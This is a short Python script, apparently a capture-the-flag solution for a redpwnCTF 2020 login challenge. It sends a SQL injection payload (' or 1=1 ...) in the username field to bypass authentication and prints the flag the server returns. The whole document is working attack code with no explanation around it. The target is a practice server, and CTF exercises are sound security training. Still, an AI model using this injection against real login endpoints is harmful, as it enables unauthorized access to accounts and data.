import requests


# SQL authentication bypass
url = "https://login.2020.redpwnc.tf/api/flag"
response = requests.post(
    url,
    json={
        "username": "' or 1=1 or username = 'blah",
        "password": "blah"
    }
)
assert response.status_code == 200, "[!] Failed to POST login info"

# Extract flag from response
json: dict = response.json()
assert json is not None, "[!] The server didn't return JSON"
assert json["success"], "[!] SQL injection failed"
print(f"[*] Got the flag: {json['flag']}")
